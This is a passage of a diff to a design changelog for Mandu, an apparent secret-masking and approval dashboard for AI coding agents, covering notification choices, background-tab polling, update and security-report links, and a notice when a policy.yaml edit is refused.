 `denied` and a browser that cannot notify read as before. Tests:
 `home-js-notify-off.test.ts` (jsdom) and `tests/stack/settings-notify-off`
 (the served page over a real arbiter's asks, in jsdom and a real Chromium).
+
+*The button does what it says; the row follows the permission
+(2026-10-30).* The row was drawn from `Notification.permission` only at
+load, on a press and on a `storage` event, while its button acted on the
+live permission and flipped the stored choice. Two tabs at `default`: Home's
+*Turn on* in one, Allow, stores Everything by removing a key that was
+already absent, so no `storage` event reaches the other, which still reads
+"Off." with *Turn on*; its press found the permission granted and the choice
+Everything, stored Nothing, and every tab followed: *Turn on* turned them
+off, "protection failed" included. The browser's own controls left the same
+stale row in one tab (unblocked in the site panel, it kept "Blocked …";
+reset to ask, it kept "On. …" and *Send a test*). Now:
+
+- **The button acts on what it shows** (`data-intent`, set where the row is
+  drawn): *Turn off* stores Nothing, whatever the permission now is, and
+  never asks the browser; *Turn on* stores Everything where the permission
+  is granted, and otherwise asks for it as before. It never flips a choice
+  the row did not show. The row is then drawn from the live permission.
+- **The row and Home's offer follow the permission.** Where
+  `navigator.permissions.query({ name: 'notifications' })` resolves, its
+  `change` event redraws; where it throws or rejects (some browsers) or is
+  missing (older Safari), the poll and the tab showing redraw. Both also run
+  where the event exists, as some browsers fire it unevenly, and redraw only
+  when the permission differs from the one drawn, so a poll keeps *Send a
+  test*'s line. A redraw is only the row, so the focus stays. A permission
+  granted in another tab hides this tab's offer and reads "On. …" within a
+  poll; one unblocked in the site panel reads "On. …" without a reload.
+
+Words, Only protection problems, Send a test and priming are unchanged (a
+permission that turns granted under an open tab notifies no backlog: every
+ask is recorded as seen whatever the permission). Tests:
+`home-js-notify-off.test.ts` (a)–(d) and `tests/stack/settings-notify-off`
+T8 (a real ask after a stale *Turn on* shows exactly one notification).
+
+*No thanks on Home's offer (2026-10-29).* The offer row ("Get a
+notification on this computer when an agent needs your OK." with *Turn on*)
+showed on every Home visit while the permission was `default`, and the only
+way to make it go was the browser's own prompt: someone who did not want
+notifications lived with it above Approvals waiting, or pressed *Turn on*
+and then the browser's *Block*, a per-site choice the page can never undo.
+Its words also named only questions, while since the alarms below a
+notification also says protection failed, the service stopped under a
+running agent, or another agent can reach Mandu's controls. Now:
+
+- **The words** read "Get a notification on this computer when an agent
+  needs your OK or protection fails." (`#notify-offer-words`, which both
+  buttons are described by).
+- **No thanks** (`#notify-offer-no`, `btn small`, beside *Turn on*) hides
+  the offer in this browser without asking for the permission
+  (`declineNotifyOffer` in `home.js`). The choice is its own key,
+  `mandu.home.notifyOfferHidden` = `'1'`, not `mandu.home.notifyOff`: that
+  is Settings' choice of what they send, and Turn off has always left the
+  offer alone. Where storage fails it holds for the tab, as that choice
+  does. Another open tab's offer goes on the `storage` event.
+- **One line in its place**, for this load only: "You can turn them on later
+  in Settings › Notifications.", its link (`#notify-offer-later-link`) to
+  `/settings#notifications`, opening Settings at that card as a section link
+  does. The focus moves to the link, so it is not lost with the button; the
+  line is gone on the next load, and whenever the permission is no longer
+  `default`.
+- **Unchanged.** Settings › Notifications keeps *Turn on* while the
+  permission is `default`, and reads "Off.". A *Turn on* that gets the
+  permission granted, there or on the offer, clears the key: asking means
+  wanting them, the rule it already follows for a stored "off". *Turn on* on
+  the offer, `denied`, a browser that cannot notify and the tab title's count
+  do not change.
+- **Layout.** The offer wraps (`flex-wrap`): at 1280 px the words and the two
+  buttons keep one row; at 390 px the buttons, kept together, go under the
+  words inside the dashed box.
+
+Presentation and a per-browser preference only: no route, policy or approval
+changes. Tests: `home-js-notify-off.test.ts` (jsdom) and
+`tests/stack/settings-notify-off` (the served page over a real arbiter: No
+thanks, a reload with no offer, a real ask counted in the tab title,
+Settings' *Turn on* still asking; in Chromium a real Enter, the focus on the
+link, a real reload, and the offer's layout at 1280 and 390 px).
+
+*Only protection problems (2026-10-26).* Turn off was one choice for every
+kind, so someone who answers questions in the tab, or finds a notification
+per question too much, had to silence the alarms below with them: protection
+failed, the service stopping under a running agent, another agent reaching
+Mandu's controls, the states a person must not miss. With permission
+granted the row now also has a menu under its words, "Notify me about"
+(`#notify-kind`, named by its `<label>`): **Everything** (the default, the
+On above), **Only protection problems** (no notification for a question or
+a rule change; the three alarms still notify) and **Nothing** (Turn off).
+The button stays, as one control over the same choice: *Turn off* is
+Nothing, *Turn on* is Everything. It is still one per-browser key,
+`mandu.home.notifyOff`: absent is Everything, the `'1'` Turn off has stored
+since 2026-10-19 is Nothing, so nobody who turned them off gets them back,
+and `'alarms'` is Only protection problems; a value the page does not know
+reads as Everything, as any but `'1'` did (a revert to the old page reads
+`'alarms'` as on). Where storage fails it holds for the tab, and other tabs
+follow on the `storage` event, as before. `showAlarm` takes a kind, `ask`
+(questions, rule changes, the "N more" line) or `alarm` (protection failed,
+the service stopped, the exposure); the seen-recording runs before it, so a
+question silenced by the choice is still recorded as seen and switching
+back never brings the backlog. The row's words name what the choice sends:
+"On for protection problems only. You get a notification when protection
+fails, when the protection service stops under a running agent, and when
+another agent can reach Mandu's controls, while a Mandu tab is open in this
+browser, also in the background. Not for questions or rule changes: the tab
+title still counts the questions waiting." *Send a test* shows while the
+choice sends something, and under Only protection problems its body reads
+"This is how Mandu tells you when protection fails." A change redraws only
+the row, so the focus stays on the menu. The menu sits in the words' column,
+so at 390 px the row's two buttons keep a line of their own. The Home offer
+row, the permission flow and the screen reader's announcement
+(`#top-announce`) do not change. Tests: the same two files (in the stack
+test a real ask stays silent and a session the real arbiter records as
+failed notifies once; in Chromium the menu fits the row at 1280 and 390 px).
 
 *Send a test, and a browser that cannot show them (2026-10-22).*
 Notifications fire only on rare events, so until then the first real one
@@ -6327,7 +8129,9 @@ claiming "On." where nothing can show. Tests: the same two files.
 states reached a person with the tab in the background only when they
 opened it. home.js `notifyAlarms` adds two kinds, both on the answer
 `loadHome` keeps (an older poll's dropped answer never notifies), behind the
-same gate as asks (permission granted, not turned off):
+same gate as asks (permission granted, not turned off; since 2026-10-26
+Only protection problems keeps them while it silences asks, *Only
+protection problems* above):
 
 - **Protection failed.** A session in `home.agents` with `holds: false` that
   this browser has not seen failed raises "Mandu: protection failed in
@@ -6348,13 +8152,13 @@ same gate as asks (permission granted, not turned off):
   agent running (a normal state between agents) says nothing at all.
 - **Another agent can reach Mandu's controls (2026-10-21).** Until then the
   exposure (§4.25x) showed only on Home's card, while the person's other
-  agents got placeholders and masked output for no reason the terminal
+  agents got masked copies and masked output for no reason the terminal
   told. A kept read whose `home.exposure` this browser has not been told of
   raises "Mandu: another agent can reach Mandu's controls", body "Your
   other agents get masked copies of secret files and masked output until
-  it stops. Open Home to see which agent." ("masked copies", not the
-  card's "placeholders": the page's own strings keep that word retired,
-  §4.25u), tag `mandu-exposure-<since>` (`since`: when
+  it stops. Open Home to see which agent." ("masked copies", as the card
+  has said too since 2026-10-27: the page's own strings keep "placeholder"
+  retired, §4.25u), tag `mandu-exposure-<since>` (`since`: when
   the arbiter first saw the current exposure); a click opens Home, where
   the card names the agent and the fix. Fixed words, with no agent name,
   process id, session, file or host: the causes' names come from a
@@ -6375,7 +8179,8 @@ telling the person with no dashboard tab open*, below). Settings ›
 Notifications' "On" line names all four: "On. You get a notification when
 an agent needs your OK, when protection fails, when the protection service
 stops under a running agent, and when another agent can reach Mandu's
-controls." Tests: `home-js-home.test.ts` (jsdom, the *alarms:* cases),
+controls, while a Mandu tab is open in this browser, also in the
+background." (the last clause since 2026-10-25). Tests: `home-js-home.test.ts` (jsdom, the *alarms:* cases),
 `tests/stack/home-hero-failure-words` (H5: a real arbiter stopped under a
 running session, one notification, the H4 oracle on its words) and
 `tests/stack/human-plane-exposure-notice` (the served page open while
@@ -6466,6 +8271,102 @@ arbiter's pending send of a masked variable, then the agent's rule change,
 with permission denied: each line, and no `$MDU` token, secret name, value
 or host in the region).
 
+*A background tab keeps reading (2026-10-25).* Until then the 10 s poll
+read only while the tab was `visible`. Every notification is raised from
+that read (`loadHome`), so a tab behind another tab, or in a minimised
+window, notified on its first poll after the person came back to it, when
+they were already looking at the page, while the program that asked waits
+up to 60 s for the answer. Its title count and icon (`renderTitle`, drawn
+by the same read) stayed as the person left the tab, so Settings' advice
+"keep this tab open: the tab title still counts what waits"
+(`NOTIFY_CANNOT`) was untrue, and the "On" line never said a tab must stay
+open. Now (`boot`, `loadHome`, `tabHidden` in `home.js`):
+
+- **What keeps running while the tab is hidden.** The 10 s tick reads
+  `/api/home` and the rule changes waiting (`loadProposals`, which rides
+  the same read) as a shown tab does, and draws as a shown tab does: the
+  notifications (`notifyAlarms`, `notifyNewAsks`), the title's count, the
+  icon, the nav badge, Home's sections. A draw in the background keeps the
+  focus and the scroll place by the rules of a shown poll (`pollPlace`,
+  `pollRefocus`). A Home poll that answers after one that failed still
+  reads again what could not be read (`readAgainUnread`), so the return
+  does not lose it.
+- **What waits for the tab to be shown again.** The reads only a person
+  looking at the page needs: the services row on Settings
+  (`followServices`), the open session page's read (`loadAgent`), History's
+  (`followHistory`), Approvals' *Rule changes* and *Answered*
+  (`loadRuleHistory`, `followAnswered`), the Scan page's read again and the
+  Plugins page's. The screen-reader line (`announceNewAsks`) waits too, and
+  its page-memory sets stay as they were, so the first poll after the
+  return says what arrived meanwhile, once. Coming back to the tab reads
+  at once (`visibilitychange`), as before; going to the background reads
+  nothing by itself. A page the browser prerenders reads nothing.
+- **Values shown stay hidden.** A value shown on the session page hides
+  when the tab goes to the background (*It hides itself again*,
+  2026-10-22); the session page is not read nor drawn while hidden, so no poll
+  draws it again.
+- **How often.** Browsers slow the timers of a background tab: Chrome runs
+  them about once a minute after the tab has been hidden for five minutes,
+  and a frozen or discarded tab runs none. So a background tab notifies
+  within 10 s at first and within about a minute later, not within 10 s
+  always; the On line promises only that it notifies while a Mandu tab is
+  open in this browser. Each open Mandu tab reads Home as often as a shown
+  one does, which is what leaving one tab in front costs; for a local
+  dashboard several tabs reading is acceptable, and the fixed notification
+  tags make them show one notification between them.
+
+Settings › Notifications' "On" line ends "…, while a Mandu tab is open in
+this browser, also in the background."; `NOTIFY_CANNOT` is unchanged and
+now true. No route, read gate or answer changes. Tests:
+`home-js-hidden-poll.test.ts` (jsdom, the page's setInterval captured:
+a hidden tick reads Home, one notification and "(2) …" in the title and
+icon; no services row nor session read while hidden, both at once on the
+return; the screen-reader line silent while hidden and said once on the
+return; notifications off: none shown, the title counts; a prerendered
+page reads nothing; the On line) and `tests/stack/hidden-tab-notifies` (a
+real arbiter's pending send of a masked variable while the served page is
+hidden, in jsdom and a real Chromium: one notification "Mandu: … needs your
+OK" on the next tick, a title of "(1) …", and neither the secret's value
+nor a `$MDU` token in its words).
+
+*A question's notification names its folder (2026-10-30).* Until then the
+title was "Mandu: Claude Code needs your OK", so with two sessions of one
+agent open, say one in `~/projects/shop` and one in `~/work/api`, both read
+the same and the person could not tell which terminal waited, while the
+card has said so since 2026-10-18 (§4.25u *A question says which session
+asked*). The title now names the agent and folder of the session that asked
+last, in the card's words and path form (`askNoteTitle`, `shortPath` in
+`home.js`): "Mandu: Claude Code in ~/projects/shop needs your OK". With no
+folder known (`askerCwd` absent) the title is as before; the body (the ask's
+sentence), the screen-reader line and a rule change's fixed-word title are
+unchanged. The folder can leave the machine with a mirrored notification,
+as the body's file and host already could.
+
+*A notification closes once nothing waits (2026-10-30).* Until then a
+question's or rule change's notification closed only when clicked: after
+the question was answered on the page, in another tab, or expired, it
+stayed in the system's notification list (macOS Notification Center, the
+Windows Action Center, GNOME's list) still saying the agent "needs your
+OK", and its click opened Approvals at nothing. Now the page keeps the
+notifications it showed for these in tab memory, by tag (`mandu-ask-<id>`,
+`mandu-proposal-<id>`, `mandu-more`; `keepNote`, `closeAnsweredNotes` in
+`home.js`), and each poll whose list answered (`waitingKnown` for
+questions, `proposalsKnown` for rule changes) closes each one whose id it no
+longer lists: answered here or elsewhere, expired, or decided. A poll that
+failed, or a refused rule-change read, closes nothing. "N more need your OK"
+closes once every kind it counted answered with none waiting. A question
+from a session that has ended still waits in Approvals, so its notification
+stays. The alarms (protection failed, the service stopped, the exposure) are
+not touched. Known limit: the page has no service worker, so only the tab
+that showed a notification can close it; one whose tab was closed or
+reloaded meanwhile stays until clicked or dismissed. A notification that
+failed to construct is not kept. Tests: `home-js-home.test.ts` (the title
+with and without a folder; an answered question, a refused or failed read,
+an ended session's question, a decided rule change, the "1 more" line) and
+`tests/stack/hidden-tab-notifies` H5 (Block through the real approvals
+route while the tab is hidden: the next tick closes that notification, in
+jsdom and a real Chromium).
+
 **Appearance (2026-10-18).** Until then the product page always followed
 the system's light or dark (§4.25k): only the inspector had a picker, so a
 person who picked Dark there was back in light on `/`, and a person with
@@ -6476,7 +8377,11 @@ developer-only card) with *Appearance*, one row, "Colours", and a menu:
 - **One choice for both pages.** The menu stores `system` | `light` |
   `dark` under `mandu.theme` in localStorage, the key and values the
   inspector's Appearance row (§4.8) already used. Both pages are served
-  from one origin, so a pick on either is the other's on its next load.
+  from one origin, so a pick on either is the other's. A pick applies at
+  once in every open product tab of the browser, its menu too, with no
+  reload (the `storage` event, as Notifications' Turn off does; a storage
+  clear reads as *Same as this computer*; the "Not remembered" note stays
+  the window's own); the developer view takes it on its next load.
   `system` leaves `<html>` bare (mandu.css follows `prefers-color-scheme`);
   `light` / `dark` set `data-theme`. A stored value the page does not know
   (the retired `theme-*` palettes) reads as *Same as this computer*.
@@ -6491,6 +8396,9 @@ developer-only card) with *Appearance*, one row, "Colours", and a menu:
   the page, and the row says "Not remembered in this window."
 - The forced-colors and reduce-motion rules (§4.25k) key on media queries,
   not on the theme, so they hold under a pinned one.
+- **A print is light** whatever the choice (2026-10-26): a page printed
+  or saved as PDF uses the light palette (§4.25b *On paper, the light
+  palette*).
 
 **About Mandu (2026-10-20).** Until then no page said which Mandu ran, and
 the one way to get help was the *Report a problem* link on a preview
@@ -6509,20 +8417,55 @@ developer-only card) with *About Mandu*:
   a bare "unknown".
 - **One note:** "To check this computer's setup, run `mandu doctor` in a
   terminal."
-- **Three links:** *Guide* (`docs/usage.md`), *Troubleshooting*
-  (`docs/usage.md#troubleshooting`), both at the public docs base, and
-  *Report a problem* (the issue tracker, `ISSUES_URL`). Each opens in a new
+- **Four links:** *Guide* (`docs/usage.md`), *Troubleshooting*
+  (`docs/usage.md#troubleshooting`), both at the public docs base,
+  *Report a problem* (the issue tracker's bug form, `bugReportUrl`, below), and, since
+  2026-10-25, *Report a security problem* (GitHub's private vulnerability
+  report form, `SECURITY_REPORT_URL`,
+  `https://github.com/mandusec/mandu/security/advisories/new`, the address
+  `.github/ISSUE_TEMPLATE/config.yml` gives too). Until then the card had no
+  way to report a security problem, and `SECURITY.md` asks for exactly
+  that: never a public issue, a private report first; the bug form makes
+  its reporter tick that the report is not a vulnerability. *Report a
+  problem* stays the public tracker, for bugs. Each opens in a new
   tab with `rel="noopener noreferrer"`, as the preview tag's link does: the
   page's address can name a session, and neither the opened page nor its
   server should get it. Only an `https://` address is drawn as a link.
-  *Report a problem*'s tooltip and a line under the links say "… say which
-  version you run: Mandu <version>." (only when the version is known).
+  Both report links' tooltips and a line under the links say "… say which
+  version you run: Mandu <version>." (only when the version is known; the
+  line shows when either report link is drawn). A missing or non-`https:`
+  `securityUrl` draws no fourth link and no stray separator.
+- **Report a problem opens the bug form (2026-10-28).** Until then it
+  opened the issue *list*: the reporter pressed *New issue*, picked *Bug
+  report*, and copied the version from the line under the links into the
+  form's required *Mandu version* field by hand. It now opens GitHub's
+  bug form with that field filled in,
+  `…/issues/new?template=bug_report.yml&version=0.2.0-beta.8` (GitHub
+  fills an issue form's field from the query parameter named by its id).
+  The server builds the address (`bugReportUrl`, `BUG_REPORT_TEMPLATE`)
+  from `ISSUES_URL` and a version that parses as semver (`parseVersion`,
+  as *A newer release* checks), trimmed and URL-encoded (`+` is `%2B`);
+  any other text is left out and the form opens with the field empty.
+  Only the version is sent, which the reporter sees in the form before
+  submitting: no session, path or secret name. When the address carries
+  the version shown, the link's tooltip and the line say "Report a problem
+  opens GitHub's bug form with your version, Mandu <version>, filled in.",
+  and, while *Report a security problem* is drawn too, " For a security
+  problem, say which version you run." (that report is written by hand;
+  its tooltip keeps the words above). An older server sends no
+  `bugReportUrl`, and a non-`https:` one is not drawn: the link is the
+  issue list with the words of before. The preview tag's *Report a
+  problem* and the launcher's notice keep the issue list: they do not
+  name the version there.
 - **Where the data comes from.** `about: { version, guideUrl,
-  troubleshootingUrl, issuesUrl }` on the `/api/home` answer every page
+  troubleshootingUrl, issuesUrl, bugReportUrl, securityUrl }` on the `/api/home` answer every page
   already polls (`HomeVM.about`, `homeAbout`): no new route, and `/api/home`
   keeps its read gate. The docs base mirrors the launcher's
   (`launcher/src/docs-url.ts`), since the dashboard ships standalone;
-  `tests/stack/about-mandu-parity` keeps the two equal, the issue tracker too.
+  `tests/stack/about-mandu-parity` keeps the two equal, the issue tracker too,
+  the bug form on that tracker, a template that exists in
+  `.github/ISSUE_TEMPLATE/` whose input field id is still `version`, and
+  the private report form on the issue tracker's own repository.
 - **When it draws.** home.js `renderAbout` runs on every page's Home poll,
   as *Built-in protections* does, so Settings opens with it drawn; it draws
   again only when `about` changed. Before the first answer the row reads
@@ -6552,18 +8495,82 @@ leaks for weeks and never be told on the page. Now:
   that time is in the future). "Then start your agent again": after `npm
   install -g` the running dashboard is still the old code, so the row keeps
   saying a newer release is out until the next `mandu` replaces the older
-  resident stack (arbiter-version.ts).
+  resident stack (arbiter-version.ts). A newer release's words end with a
+  link to what it changes (*What changed*, below).
 - **No answer** (no cache, one the reader refuses, or no check ever got the
   list): the row is as before, and a quiet line under the doctor note says
-  "Mandu checks for a newer release when you start an agent from a
-  terminal." A version that is not known or not semver: nothing is said.
+  whether Mandu checks (below). A version that is not known or not semver:
+  nothing is said.
+- **Whether Mandu checks (2026-10-23).** Until then the quiet line always
+  said "Mandu checks for a newer release when you start an agent from a
+  terminal.", which was false for a person who had turned the check off
+  (they could not tell whether their setting took) and for a copy run from
+  source. The line now follows the launcher's `updateCheckGate`:
+  - `update-check = false` in config.toml (any value but `true`, as the
+    launcher's bool coercion reads it): "Mandu does not check for new
+    releases: `update-check = false` in config.toml. Remove that line to
+    have it check when you start an agent."
+  - a source checkout with the key unset: "This copy of Mandu runs from
+    source, so it does not check for new releases. `update-check = true` in
+    config.toml turns the check on."
+  - `update-check = true`, or an installed package with the key unset:
+    the line above, as before.
+
+  The config lines are code parts (`ownCode`); the line is text and code
+  nodes only. The key is read through the Protection card's config.toml
+  reader (`config-axes.ts`), once per Home poll for both (`readConfigText`);
+  a missing or unreadable file counts as unset. The layout is the
+  dashboard's own (`layoutOf`, the launcher's `Layout.detect` rule), so
+  `MANDU_LAYOUT=installed` forces the installed line. It rides the
+  no-answer state as `check` (`{ state: "unknown", check: "on" | "off" |
+  "source" }`, `updateCheckSetting`); `tests/stack/update-notice-parity`
+  keeps it equal to the launcher's gate for each config text and layout.
+  An old answer the launcher left before the check was turned off is still
+  drawn, its "checked …" age saying how old it is (*Stale answers*).
+  **Not covered:** a `MANDU_UPDATE_CHECK=0` exported in a shell only (the
+  dashboard service cannot see that shell, so the line says Mandu checks),
+  and the launcher's other quiet cases, CI and a launch whose output is not
+  a terminal (the default line already says "from a terminal").
 - **Home, only for security fixes:** a smaller amber card under the hero,
   after the exposure card (`#home-update`): "A security update for Mandu is
   out" / "Mandu 0.2.0-beta.9 fixes security problems in the version you run
-  (0.2.0-beta.7)." / "Update now: `…`, then start your agent again. About
-  Mandu in Settings" (a link to `/settings#about`). A plain update never
-  shows on Home. Drawn once across polls (`sameAsDrawn`); hidden when the
+  (0.2.0-beta.7)." / "Update now: `…`, then start your agent again. What
+  changed in Mandu 0.2.0-beta.9 · About Mandu in Settings" (the release
+  notes link of *What changed*, below, then a link to `/settings#about`). A
+  plain update never shows on Home. Drawn once across polls
+  (`sameAsDrawn`, whose key includes the notes address); hidden when the
   answer stops saying so or a poll fails.
+- **What changed (2026-11-04, Shoemaker #290).** Until then both places
+  asked a person to "Update now" without saying what the release changes,
+  though the launcher decides a release is a security one from its notes
+  (`SECURITY_MARKER` in the release body): the person could not see which
+  problem was fixed, or whether it touched their agent, without finding
+  the repository on GitHub. Now, after the install command (About: at the
+  row's end, after "(checked …)."; Home: before About Mandu in Settings), a
+  link opens the notes in a new tab (`target=_blank`, `rel="noopener
+  noreferrer"`, as About's other links):
+  - **One release** newer than the running one: "What changed in Mandu
+    0.2.0-beta.9", that release's notes,
+    `https://github.com/ManduSec/mandu/releases/tag/v0.2.0-beta.9`.
+  - **More than one:** "What changed since Mandu 0.2.0-beta.7" (the running
+    version), the release list, `https://github.com/ManduSec/mandu/releases`,
+    newest first. The security fix may be in a release before the newest,
+    so the newest's notes alone could leave it out.
+
+  **The server builds the address**, never the page: `aboutUpdate` adds
+  `notesUrl` and `notesSince` to the `newer` answer (`releaseNotesUrl`).
+  The tag is `v<version>`, the form the launcher reads tags in and builds
+  the install.sh address from, built only from a version that parses as
+  semver, trimmed and URL-encoded (`+` is `%2B`), as `bugReportUrl` treats
+  a version; the repository is `RELEASE_REPO`. The count of releases newer
+  than the running one uses `newerRelease`'s rule (a prerelease counts only
+  for a prerelease user, so someone on a full release is not sent to the
+  list for prereleases they are never offered) and counts a version once;
+  `newerRelease` itself is unchanged, so `tests/stack/update-notice-parity`
+  still holds it to the launcher's. **The page draws the link only for an
+  address that starts with `https://github.com/`** (`updateOf`); an older
+  server sends none, and the page draws as before. The link is only an
+  address: the dashboard still makes no network request.
 - **Where it comes from: a file, never the network.** The dashboard makes
   no request for this. It reads the launcher's cache, the path table's
   `update-check` (`<home>/cache/update-check.json`), with the launcher's
@@ -6576,12 +8583,76 @@ leaks for weeks and never be told on the page. Now:
   release's `install.sh` when `.mandu-installer` sits in the package root,
   or from a source checkout). Home's poll costs one `lstat`; the file is
   read again only when it changed. The answer rides `/api/home`'s `about`
-  as `update` (`aboutUpdate`: `unknown`, `current`, or `newer` with
-  `newest`, `security`, `install`, `at`).
+  as `update` (`aboutUpdate`: `unknown` with `check`, `current`, or `newer`
+  with `newest`, `security`, `install`, `notesUrl`, `notesSince`, `at`).
 - **Stale answers.** A user who turned the check off keeps the last list,
   and its "checked … ago" shows its age. A forged cache (residual in
   packaging.md §11.5) can name a wrong "newer release", but only a semver
   version with the official package's install line.
+
+**An edit to policy.yaml Mandu refused (2026-10-26, nightly #155).** Rules
+says so (*Rules says where your rules file is*), but after saving the file
+in an editor people go back to their agent or glance at Home, and Home went
+on saying "Protection on" while the edit, perhaps a new lock, was not in
+force. Now Home has a notice card for it, `#home-policy-refused`, after the
+security update card and in its style (amber, `role="status"` as Rules'
+line):
+
+- **Words.** "Mandu did not take your last edit to policy.yaml" /
+  "`~/.mandu/policy.yaml` has a mistake, so Mandu is still using the last
+  version that worked (since Oct 26, 14:05). The file has 2 problems." /
+  "See what is wrong in Rules, then save the file again." The path is
+  `shortPath`'d, as code; the moment is `refusedAt` as `momentNode` writes it
+  (left out when null); the count sentence is left out at 0. The link opens
+  Rules at its refused line (`openAtCard('rules', 'rules-refused')`, the
+  focus on the line itself; a modifier click is the browser's: Rules, whose
+  line is at its top).
+- **When.** Only while the answer says `valid: false` for a named file. An
+  answer that reads the file as valid, or names no file (no reader, a read
+  that failed), hides it. A failed poll leaves it as drawn: it says nothing
+  about the file. Drawn once across polls (`sameAsDrawn('policy-refused')`).
+- **Where it comes from.** Home's own read of the policy document, the one
+  that already gives `issuer_bindings` to Rules › Built-in protections
+  (`home-routes.ts policyDocumentRead`; it runs at every level, unlike the
+  session page's read), also hands on the document's `status`. No new
+  arbiter call. The view model keeps `policyFile: { valid, path,
+  problemCount, refusedAt }` (`homePolicyFile`; absent when not read or no
+  path is named). **Home never carries the problems' words**: they can echo
+  the file, and Rules lists them. Display only: nothing changes in what the
+  service accepts or enforces.
+
+As on Rules, the arbiter also marks the file not valid when one of its own
+whole-document writes is refused, so the card may warn when the file is
+fine, never stay quiet when it is not. Tests: `home-view-model.test.ts`
+(the count, path and time; no problem text; left out when not read),
+`home-js-home.test.ts` (the words, hidden when valid or absent, kept on a
+failed poll, not redrawn, the Rules link landing on the refused line),
+`tests/stack/home-policy-refused.test.ts` (a real arbiter polling a real
+file: refused on `/api/home` and on the served Home, gone on the next poll
+once fixed).
+
+**The top bar says so on every page (2026-10-27, #215).** After saving
+the file people often go next to Approvals, to answer the question the new
+rule was meant to settle, or to the session page, to see what the agent did
+next; both read as if the edit were in force, since only Home and Rules
+said otherwise. Now, while the same condition holds as for Home's card
+(`refusedPolicyPath`: `policyFile.valid === false` for a named file), the
+top bar's **Rules** link shows "!" in a warn ring on every page, in the
+slot of its mark for changes not saved (`#nav-rules-unsaved`; style and room
+in *The top bar's two marks*). Its accessible name and title read "Rules,
+Mandu did not take your last edit to policy.yaml", and ", 2 changes not
+saved" after it while levels wait too. One function owns the mark, its name
+and title, `renderRulesMark`: the poll calls it with each answer, next to
+`renderPolicyRefusedNotice`; the list's own redraws (a choice, Save,
+another tab) call it bare and keep the last answer's word, so neither
+writes over the other. It hides once an answer reads the file as valid or
+names no file; a failed poll leaves it as drawn; drawn once across polls
+(`sameAsDrawn('rules-mark')`). The link opens Rules as before, whose
+refused line at the top lists the problems; the mark carries none of their
+words, as Home's card does not. Display only. Tests:
+`home-js-rules-unsaved-mark.test.ts` (U6 to U9), `css-nav-fits.test.ts`
+(F10 to F12), and the stack test above (the served Approvals page's Rules
+link carries it, gone on the next poll once fixed).
 
 **Not built: telling the person with no dashboard tab open** (designed
 2026-10-11, left). Every signal above needs a tab: the title count, the
@@ -6659,13 +8730,17 @@ that loosens it (policy-surface.md §8.3); the ask lands on Approvals.
   ALLOW if you mean it." (*A wide change says what is open*). An Allow answered
   `refiled` (the policy moved and approving would now give up more) shows
   "The rules changed since your agent asked; here is the updated request".
-  A request that is not the agent's (your own, left waiting when its
+  An Allow or Not now that worked leaves a line where the card was, with
+  the *Undo it* of the change an Allow made (§4.25 *An answer says what it
+  did*, *A rule change*). A request that is not the agent's (your own, left waiting when its
   approval failed) says "You want to change a rule", labels its reason
   "Note" and says "since this was asked" (`byAgent`, *A rule change you
   asked for is never credited to your agent*).
 - **Where it shows**: Approvals' *Rule changes your agent asked for* block
   (hidden when empty; *Rule changes waiting for you* while one is not the
-  agent's), a line on Home, a line on the agent page of the agent
+  agent's; *Rule changes Claude Code asked for* while one session of a
+  known agent asked them all, *Home and the heading name the agent*), a
+  line on Home, a line on the agent page of the agent
   that asked, whose page the card links (*A rule change and the agent that
   asked*), and a line on the inspector's
   Approvals that links here (§4.34 *A rule change your agent asked for is
@@ -6692,10 +8767,32 @@ the result. Nothing changes until **Apply**.
   the same box (`confirmBox`), so Enter in it presses Apply.
 - **Apply** sends `POST /api/policy/assistant/apply {edits, expected}`
   exactly as previewed; a 409 (the rules changed and applying would now
-  loosen more than was shown) offers **Describe it again**.
+  loosen more than was shown) offers **Describe it again**. Applied, the
+  line "Applied. Your rules are updated." has **Undo** and **See it in
+  Approvals**, at the change the route answers (`changeId`; *Every change
+  made on Rules ends with an Undo or a link*, below).
 - **Try it** on a `tryable` row: `POST /api/policy/assistant/try {edits,
   index}` runs the arbiter's Test a flow now and with the whole suggestion
   (nothing written) and shows "Now:" / "After:".
+- **The limit is said on the page, and Ctrl+Enter suggests rules
+  (2026-10-28).** The box keeps 2,000 characters (`maxlength`, the route's
+  `SENTENCE_MAX`), and a browser cuts a longer paste without a word: a
+  team's written policy, which the box's own example invites, reached the
+  helper half read. Now (`home.js` `describeLength` / `describePasted`):
+  past 1,800 characters a quiet count shows under the box, "1,950 of 2,000
+  characters" (not a live region); a paste that would pass 2,000 (the
+  box's length less the selection, plus the pasted text, a CRLF counted as
+  one character) sets the line "Only the first 2,000 characters fit.
+  Mandu's helper reads only those: shorten it or describe the rules in
+  your own words." (`#describe-cut`, `role="status"`, written once), which
+  clears when the text is edited back under the limit. Typing up to the
+  limit shows only the count. The box is described by both
+  (`aria-describedby`). **Ctrl+Enter** (Cmd+Enter on a Mac) in the box
+  presses *Suggest rules* (`submit.click()`, the button's own path, so a
+  press while the helper works and the button is off starts nothing);
+  the button says so (`aria-keyshortcuts="Control+Enter Meta+Enter"`).
+  Enter alone still makes a new line, and the focus stays in the box. What
+  is sent is unchanged: the same text, route and cap.
 - **Fail-closed**: with no helper model, 503 `{unconfigured: true, reason}`,
   never a guessed rule; a 422 (not a valid rule change) shows its
   problems.
@@ -6731,12 +8828,120 @@ the result. Nothing changes until **Apply**.
   Presentation only: the fail-closed decision and the channel selection
   (inspect-mcp) are unchanged. A unit test reads `ullm-config.ts` and fails
   when one of its three messages no longer starts as the classifier
-  expects, so a reworded message cannot fall to `other` unnoticed. **Models are read-only here** (policy-surface.md §8.4.3a): an
+  expects, so a reworded message cannot fall to `other` unnoticed.
+- **Describe says which AI reads your words, before you write
+  (2026-10-26).** The card said only that "a helper suggests rules": not
+  that pressing *Suggest rules* sends the words, with a summary of the
+  rules, to an AI outside Mandu, nor, until the press, that no helper can
+  run. Now a line in the `note` style sits under the card's note
+  (`#describe-where`, which also describes the box), drawn from
+  `GET /api/policy/assistant/channel` when Rules opens and again when the
+  box gets the focus once the last read is over 30 s old (`home.js`
+  `describeWhere`; the read walks PATH, so never per poll). The route runs
+  the same module import and `selectUllmConfig(env, isOnPath)` as Suggest
+  rules (`policy-assistant.ts` `selectAssistantChannel`, shared with
+  `productionAssistantModel`), builds no client, calls no model, and
+  answers **only an enum** (`channelOnly` re-projects whatever answered):
+  `{ready: true, via}` or `{ready: false, reason}` with the reasons above;
+  never the key, the base URL, a binary path or a model name. For the CLI,
+  `via` names the binary the client would spawn (`channelVia`: the hint
+  when it names one, else `codex` for an OpenAI model id, else `claude`,
